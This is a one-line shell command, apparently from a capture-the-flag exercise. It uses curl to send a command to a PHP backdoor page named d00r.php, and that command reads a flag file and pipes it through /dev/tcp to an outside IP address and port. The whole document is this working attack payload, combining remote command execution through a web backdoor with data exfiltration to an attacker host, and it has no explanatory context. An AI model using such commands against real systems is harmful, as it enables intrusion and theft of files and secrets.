curl -v -d "#=cat ~/flag_is_here > /dev/tcp/140.112.16.134/9453" http://edu-ctf.csie.org:10151/d00r.php\?87\=%01HU%11
